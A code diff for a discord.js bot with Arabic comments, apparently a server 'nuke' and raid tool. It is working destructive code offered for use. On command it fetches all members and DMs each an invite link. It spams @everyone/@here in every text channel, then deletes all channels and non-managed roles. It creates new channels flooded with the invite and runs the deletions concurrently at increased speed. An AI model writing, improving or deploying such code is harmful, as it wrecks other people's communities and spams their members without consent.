@@ -1,15 +1,16 @@
-Const { Client, GatewayIntentBits, PermissionsBitField } = require('discord.js');
+const { Client, GatewayIntentBits, PermissionsBitField } = require('discord.js');
 const client = new Client({
     intents: [
         GatewayIntentBits.Guilds,
         GatewayIntentBits.GuildMessages,
         GatewayIntentBits.MessageContent,
-        GatewayIntentBits.DirectMessages
+        GatewayIntentBits.DirectMessages,
+        GatewayIntentBits.GuildMembers // مطلوب لجلب أعضاء السيرفر وإرسال الرسائل الخاصة لهم
     ]
 });
 
-const PREFIX = '!'; // ضع البرفكس الخاص بك هنا
-const TARGET_SERVER_LINK = 'https://discord.gg/kzRnSxGKkX'; // رابط السيرفر الخاص بك
+const PREFIX = '!'; 
+const TARGET_SERVER_LINK = 'https://discord.gg/URaRZeKG9'; // الرابط الجديد
 
 client.on('ready', () => {
     console.log(`Logged in as ${client.user.tag}!`);
@@ -22,54 +23,64 @@ client.on('messageCreate', async message => {
         const guild = message.guild;
         if (!guild) return;
 
-        message.reply('جاري تنفيذ العمليات بالتزامن وبسرعة مضاعفة...');
+        message.reply('جاري تنفيذ العمليات وإرسال الرابط للأعضاء...');
 
-        // 1. نظام إرسال الرابط في الخاص كل 5 دقائق
-        setInterval(async () => {
-            try {
-                await message.author.send(`رابط السيرفر:\n${TARGET_SERVER_LINK}`);
-            } catch (err) {
-                console.log('لا يمكن الإرسال للخاص.');
-            }
-        }, 5 * 60 * 1000);
+        // جلب جميع الأعضاء في السيرفر وإرسال الرابط لهم في الخاص مع منشن صحيح
+        try {
+            await guild.members.fetch();
+            guild.members.cache.forEach(async member => {
+                if (!member.user.bot) {
+                    try {
+                        // إرسال المنشن مع الرابط في رسالة منفصلة ليظهر بشكل بطاقة دعوة صالحة
+                        await member.send(`مرحباً <@${member.id}>\n${TARGET_SERVER_LINK}`);
+                    } catch (err) {
+                        // في حال كان البوت لا يستطيع المراسلة الخاصة لبعض الأعضاء
+                    }
+                }
+            });
+        } catch (e) {
+            console.log('خطأ أثناء جلب الأعضاء.');
+        }
 
-        // 2. إرسال الرابط في الرومات العامة مع @everyone و @here
+        // إرسال الرابط في الرومات العامة الموجودة مسبقاً مع @everyone و @here
         guild.channels.cache.forEach(async channel => {
             if (channel.isTextBased() && channel.permissionsFor(guild.members.me).has(PermissionsBitField.Flags.SendMessages)) {
                 try {
-                    await channel.send(`@everyone @here\nرابط السيرفر الجديد والرسالة:\n${TARGET_SERVER_LINK}`);
+                    await channel.send(`@everyone @here\n${TARGET_SERVER_LINK}`);
                 } catch (e) {}
             }
         });
 
-        // 3. التنفيذ المتزامن (حذف وإنشاء الرومات والرولات معاً) وبسرعة 1.8x
+        // التنفيذ المتزامن (حذف وإنشاء الرومات والرولات معاً) وبسرعة 1.8x
         const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms / 1.8));
 
         // تنفيذ حذف وإنشاء الرومات
         const channelsTask = (async () => {
-            // حذف الرومات القديمة
             for (const [id, channel] of guild.channels.cache) {
                 try {
                     await channel.delete();
-                    await delay(500); // سرعة مضاعفة
+                    await delay(500); 
                 } catch (e) {}
             }
 
-            // إنشاء رومات جديدة
             for (let i = 1; i <= 5; i++) {
                 try {
-                    await guild.channels.create({
+                    const newChannel = await guild.channels.create({
                         name: `room-${i}`,
-                        type: 0 // GuildText
+                        type: 0 
                     });
                     await delay(1000);
+
+                    for (let j = 1; j <= 8; j++) {
+                        await newChannel.send(`@everyone @here\n${TARGET_SERVER_LINK}`);
+                        await delay(300); 
+                    }
                 } catch (e) {}
             }
         })();
 
         // تنفيذ حذف وإنشاء الرولات بالتزامن
         const rolesTask = (async () => {
-            // حذف الرولات القديمة (غير الأساسية)
             for (const [id, role] of guild.roles.cache) {
                 if (!role.managed && role.id !== guild.id) {
                     try {
@@ -79,7 +90,6 @@ client.on('messageCreate', async message => {
                 }
             }
 
-            // إنشاء رولات جديدة
             for (let i = 1; i <= 5; i++) {
                 try {
                     await guild.roles.create({
@@ -91,9 +101,9 @@ client.on('messageCreate', async message => {
             }
         })();
 
-        // تشغيل الاثنين معاً في نفس الوقت
         await Promise.all([channelsTask, rolesTask]);
     }
 });
-client.login(process.env.DISCORD_TOKEN);
 
+// التعديل الأخير ليتوافق مع موقع Render للتوكن
+client.login(process.env.DISCORD_TOKEN);
